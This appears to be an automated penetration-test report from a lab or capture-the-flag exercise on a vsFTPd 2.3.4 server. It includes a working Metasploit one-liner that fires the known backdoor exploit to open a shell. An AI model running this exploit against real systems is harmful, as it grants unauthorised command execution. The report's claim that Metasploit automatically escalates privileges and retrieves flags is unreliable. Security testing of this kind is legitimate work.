
        <html>
            <head><title>vsftpd 2.3.4</title></head>
            <body>
                <h1>vsftpd 2.3.4</h1>
                <h2>Discovery summary:</h2>
                <p></p>
                <p>The nmap scan reveals that the host at 172.18.0.2 is running a FTP server (vsFTPd 2.3.4) on TCP port 21. The control connection and data connections will be in plain text. Considering vsFTPd 2.3.4 has known vulnerabilities, this could potentially give a threat actor user and root access to the system if exploited.</p>
                <h2>Attack Advice:</h2>
                <p>Vulnerability: `VSFTPD v2.3.4 Backdoor Command Execution`

POC Script:
              
#!/bin/bash

# Using Metasploit
msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 172.18.0.2; run; exit -y"

Explanation: 

The VSFTPD v2.3.4 contains a backdoor that triggers by entering a smiley face ":)" as the username, which open a shell on port 6200. The Metasploit framework includes an exploit for this vulnerability.

Once executed, this script starts the Metasploit console and automatically runs the vsftpd_234_backdoor exploit against the target host (as given in the script). 

As long as the service is running on the target machine and is still vulnerable, this will open a shell with the same privileges as the service. (typically, daemon or root)
  
Note, the Metasploit will also attempt to elevate its privilege once a successful connection is made to retrieve the flags. The flags, once obtained, proves that a system is compromised and usually resides in the home directory of the user or the root directory.</p>
                <h2>Full Discovery Result:</h2>
                <p>host: 172.18.0.2<br>protocol: tcp<br>port: 21<br>name: ftp<br>product: vsftpd<br>version: 2.3.4<br>banner: 220 (vsFTPd 2.3.4)<br>ftp-syst: 
  STAT: 
FTP server status:
     Connected to 172.18.0.3
     Logged in as ftp
     TYPE: ASCII
     No session bandwidth limit
     Session timeout in seconds is 300
     Control connection is plain text
     Data connections will be plain text
     vsFTPd 2.3.4 - secure, fast, stable
End of status<br></p>
            </body>
        </html>
        